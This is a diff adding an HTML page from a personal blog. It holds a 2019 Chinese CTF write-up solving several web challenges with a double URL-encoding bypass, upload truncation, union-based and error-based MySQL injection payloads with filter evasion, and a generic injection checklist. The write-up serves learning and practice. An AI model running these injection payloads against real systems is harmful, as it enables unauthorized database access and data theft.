@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>一些和sql注入有关的web题wp | Damya&#39;s Blog | あややこやや</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="个人ctf竞赛">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Damya</h5>
+          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
+            
+              <span>3</span>
+            
+              <span>9</span>
+            
+              <span>7</span>
+            
+              <span>5</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>5</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/DamyaHome" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>一些和sql注入有关的web题wp</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">一些和sql注入有关的web题wp</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-06-11T13:27:54.000Z" itemprop="datePublished" class="page-time">
+  2019-06-11
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup-web/">ctf writeup web</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-一些和sql注入有关的web题wp"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">一些和sql注入有关的web题wp</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-06-11 21:27:54" datetime="2019-06-11T13:27:54.000Z"  itemprop="datePublished">2019-06-11</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup-web/">ctf writeup web</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php</a></p>
+<p>页面：<br>Notice: Use of undefined constant id - assumed ‘id’ in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 2</p>
+<p>Notice: Undefined index: id in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 2</p>
+<p>Deprecated: Function eregi() is deprecated in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 2</p>
+<p>Notice: Use of undefined constant id - assumed ‘id’ in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 7</p>
+<p>Notice: Use of undefined constant id - assumed ‘id’ in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 7</p>
+<p>Notice: Undefined index: id in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 7</p>
+<p>Notice: Use of undefined constant id - assumed ‘id’ in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 8</p>
+<p>Can you authenticate to this website? index.php.txt</p>
+<p>访问index.php.txt</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure>
+<p>eregi()函数查找数组中的字符串，当查找到“hackerDJ”时输出“not allowed！”<br>urldecode()函数存在sql注入漏洞，会对字符串进行二次编码<br>只要输入二次编码后的字符串就行<br>%25解码后为%，与后面的68结合成%68进行二次解码，解码为h</p>
+<p>payload:<a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568ackerDJ" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568ackerDJ</a></p>
+<hr>
+<h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p><a href="http://ctf5.shiyanbar.com/web/upload" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/upload</a></p>
+<p>进入是个文件上传页面，尝试上传一句话木马（.php），提示必须上传图片格式<br>上传图片后提示后缀必须为.php<br>文件上传绕过，有四种方法：文件名大小写绕过，特殊文件名绕过，0x00截断绕过，.htaccess文件攻击<br>这题用%00截断</p>
+<hr>
+<h2 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h2><p>提示有过滤<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/</a></p>
+<p>源码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>flag<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>到底过滤了什么东西？<span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">type</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>查看源代码发现是get传参<br>id=1,name=baloteli<br>1’  报错<br>查表字段union select  被过滤<br>unionunion selectselect  空格被过滤<br>试了一堆，过滤了and、union、select、空格、from和where，所以构造语句要写两遍<br>用database()函数查看id下的信息<br>1’  unionunion  selectselect  database()’<br>出现web1用户<br>ID: 1’  union select database()’<br>name: baloteli<br>ID: 1’  union select database()’<br>name: web1<br>接着查表</p>
+<hr>
+<h4 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h4><p>对于mysql和Infobright等数据库，information_schema数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。<br>information_schema.tables存储了数据表的元数据信息，下面对常用的字段进行介绍：<br>table_schema: 记录数据库名；<br>table_name: 记录数据表名；<br>engine : 存储引擎；<br>table_rows: 关于表的粗略行估计；<br>data_length : 记录表的大小（单位字节）；<br>index_length : 记录表的索引的大小；<br>row_format: 可以查看数据表是否压缩过；</p>
+<hr>
+<p>语句：1’  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  ‘1’=’1</p>
+<p>出现两条关键语句<br>ID: 1’  union select table_name  from information_schema.tables  where ‘1’=’1<br>name: admin<br>ID: 1’  union select table_name  from information_schema.tables  where ‘1’=’1<br>name: flag</p>
+<p>再查询字段名：<br>1’ unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_name=’flag</p>
+<p>ID: 1’ union select column_name  from information_schema.columns  where table_name=’flag<br>name: baloteli<br>ID: 1’ union select column_name  from information_schema.columns  where table_name=’flag<br>name: flag<br>ID: 1’ union select column_name  from information_schema.columns  where table_name=’flag<br>name: id</p>
+<p>出现flag字段，最后直接查flag<br>1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere  ‘1’=’1</p>
+<p>得到flag</p>
+<hr>
+<h2 id="简单的sql注入2"><a href="#简单的sql注入2" class="headerlink" title="简单的sql注入2"></a>简单的sql注入2</h2><p>提示有回显<br><a href="http://ctf5.shiyanbar.com/web/index_2.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php</a></p>
+<p>按照上一题的思路<br>输入1，1’报错，1 ‘  回显SQLi detected!<br>空格被过滤<br><code>1&#39; union select table_name from information_schema.tables where &#39;1&#39;=&#39;1</code><br>空格用/<strong>/代替<br>`1’/</strong>/union/<strong>/select/</strong>/table_name/<strong>/from/</strong>/information_schema.tables/<strong>/where/</strong>/‘1’=’1`<br>得到关键语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos;/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&apos;1&apos;=&apos;1</span><br><span class="line">name: admin</span><br><span class="line">ID: 1&apos;/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&apos;1&apos;=&apos;1</span><br><span class="line">name: flag</span><br><span class="line">ID: 1&apos;/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&apos;1&apos;=&apos;1</span><br><span class="line">name: web_1</span><br></pre></td></tr></table></figure></p>
+<p>接着查字段名<br><code>1&#39; union select column_name from information_schema.columns where table_name=&#39;flag</code><br><code>1&#39;/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&#39;flag</code><br>得到flag字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos;/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&apos;flag</span><br><span class="line">name: flag</span><br></pre></td></tr></table></figure></p>
+<p>查flag<br><code>1&#39; union select flag from flag where &#39;1&#39;=&#39;1</code><br><code>1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code><br>得到flag</p>
+<hr>
+<h2 id="简单的sql注入3"><a href="#简单的sql注入3" class="headerlink" title="简单的sql注入3"></a>简单的sql注入3</h2><p>提示mysql报错注入<br><a href="http://ctf5.shiyanbar.com/web/index_3.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php</a></p>
+<p>输入1，出现Hello！<br>输入1’，报错：<br>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in C:\h43a1W3\phpstudy\WWW\web\index_3.php on line 30<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’’ at line 1<br>报错提示了<code>mysql_fetch_array()</code>函数<br>函数定义:<br>mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有<br>返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p>
+<hr>
+<h4 id="上网找了十种mysql报错注入函数"><a href="#上网找了十种mysql报错注入函数" class="headerlink" title="上网找了十种mysql报错注入函数"></a>上网找了十种mysql报错注入函数</h4><p>1.floor()</p>
+<p><code>select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></p>
+<p>2.extractvalue()</p>
+<p><code>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code></p>
+<p>3.updatexml()</p>
+<p><code>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></p>
+<p>4.geometrycollection()</p>
+<p><code>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</code></p>
+<p>5.multipoint()</p>
+<p><code>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</code></p>
+<p>6.polygon()</p>
+<p><code>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</code></p>
+<p>7.multipolygon()</p>
+<p><code>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</code></p>
+<p>8.linestring()</p>
+<p><code>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</code></p>
+<p>9.multilinestring()</p>
+<p><code>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</code></p>
+<p>10.exp()</p>
+<p><code>select * from test where id=1 and exp(~(select * from(select user())a));</code></p>
+<hr>
+<p>尝试发现前三个函数均返回Don’t!,尝试用exp()<br>爆库名:<code>&#39;or EXP(~(SELECT * from(select database())a))#</code><br>出现  <code>DOUBLE value is out of range in &#39;exp(~((select &#39;web1&#39; from dual)))&#39;</code><br>爆表名：<code>&#39;or EXP(~(SELECT * from(select group_concat(table_name) from information_schema.tables where table_schema=database())a))#</code><br>出现  <code>DOUBLE value is out of range in &#39;exp(~((select &#39;flag,web_1&#39; from dual)))&#39;</code><br>爆列名：<code>&#39;or EXP(~(SELECT * from(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;)a))#</code><br>出现  <code>DOUBLE value is out of range in &#39;exp(~((select &#39;flag,id&#39; from dual)))&#39;</code><br>查flag：<code>&#39;or EXP(~(SELECT * from(select group_concat(flag) from flag)a))#</code><br>得到flag<br><code>DOUBLE value is out of range in &#39;exp(~((select &#39;flag{Y0u_@r3_5O_dAmn_90Od}&#39; from dual)))&#39;</code></p>
+<hr>
+<h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><p>相信你一定能拿到想要的<br>Hint:你可能希望知道服务器端发生了什么。。<br><a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/kzhan.php</a></p>
+<p>查看源码，发现是post传参<br>随便传个username和password值，用burpsuite抓包，改cookie里source=1，得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">&lt;h1&gt;Admins Only!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;<span class="keyword">If</span> you have the correct credentials, log in below. <span class="keyword">If</span> not, please LEAVE.&lt;/p&gt;</span><br><span class="line">&lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    Username: &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt; &lt;br&gt;</span><br><span class="line">    Password: &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt; &lt;br&gt;</span><br><span class="line">    &lt;button type=<span class="string">"submit"</span>&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>需要构造一个符合<br><code>$COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))</code><br><code>setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</code><br>的getmein条件<br><code>$secret</code>为长度15的字符串，构造一个前面为<code>xxxxxxxxxxxxxxxadminadmin</code>的大于64位的字符串，得到其hash值</p>
+<p>Hash拓展长度攻击</p>
+<hr>
+<h2 id="这个看起来有点简单！"><a href="#这个看起来有点简单！" class="headerlink" title="这个看起来有点简单！"></a>这个看起来有点简单！</h2><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a></p>
+<p>输入1’ ，报错：mysql_fetch_array() expects parameter 1 to be resource, boolean given in C:\h43a1W3\phpstudy\WWW\8\index.php on line 35<br>继续输入  and 1=1，没报错,and 1=2，返回空表，存在注入<br>order by 1,2 没报错，3报错<br>查数据库  <code>and 1=2 union select 1,database()</code>  查出表my_db<br>查数据库版本 <code>and 1=2 union select 1,version()</code>      5.5.47<br>接着查表 <code>and 1=2 union select 1, table_name from information_schema.tables</code><br>出现 news  thiskey  admin  三个关键字段名<br>查列 <code>and 1=2 union select 1, column_name from information_schema.columns where table_schema=&#39;my_db&#39; and table_name=&#39;thiskey&#39;</code>  得到字段k0y<br>然后查flag  <code>and 1=2 union select 1, k0y from thiskey</code></p>
+<hr>
+<h3 id="以上的总结"><a href="#以上的总结" class="headerlink" title="以上的总结"></a>以上的总结</h3><p>遇到有sql注入提示的题目：</p>
+<ol>
+<li><code>and 1=1</code>  <code>and 1=2</code>  检验是否存在sql注入</li>
+<li>查数据库  <code>and 1=2 union select 1,database()</code></li>
+<li>查数据库版本 <code>and 1=2 union select 1,version()</code></li>
+<li>查表 <code>and 1=2 union select 1, table_name from information_schema.tables</code></li>
+<li>查列 <code>and 1=2 union select 1, column_name from information_schema.columns where table_schema=&#39;&#39; and table_name=&#39;&#39;</code></li>
+<li>查flag  <code>and 1=2 union select 1,  from</code></li>
+</ol>
+<hr>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-11-14T09:12:15.089Z" itemprop="dateUpdated">2019-11-14 17:12:15</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/一些和sql注入有关的web题wp/" target="_blank" rel="external">https://www.damyahome.github.io/一些和sql注入有关的web题wp/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.damyahome.github.io">
+            <img src="/img/avatar.jpg" alt="Damya">
+            Damya
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/个人ctf竞赛/">个人ctf竞赛</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/一些和sql注入有关的web题wp/&title=《一些和sql注入有关的web题wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/一些和sql注入有关的web题wp/&title=《一些和sql注入有关的web题wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/一些我常用的py脚本(持续更新)/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">一些我常用的py脚本(持续更新)</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/Vue速学笔记/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Vue速学笔记</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PHP大法"><span class="post-toc-number">1.</span> <span class="post-toc-text">PHP大法</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#上传绕过"><span class="post-toc-number">2.</span> <span class="post-toc-text">上传绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#简单的sql注入"><span class="post-toc-number">3.</span> <span class="post-toc-text">简单的sql注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#资料"><span class="post-toc-number">3.0.1.</span> <span class="post-toc-text">资料</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#简单的sql注入2"><span class="post-toc-number">4.</span> <span class="post-toc-text">简单的sql注入2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#简单的sql注入3"><span class="post-toc-number">5.</span> <span class="post-toc-text">简单的sql注入3</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#上网找了十种mysql报错注入函数"><span class="post-toc-number">5.0.1.</span> <span class="post-toc-text">上网找了十种mysql报错注入函数</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#让我进去"><span class="post-toc-number">6.</span> <span class="post-toc-text">让我进去</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#这个看起来有点简单！"><span class="post-toc-number">7.</span> <span 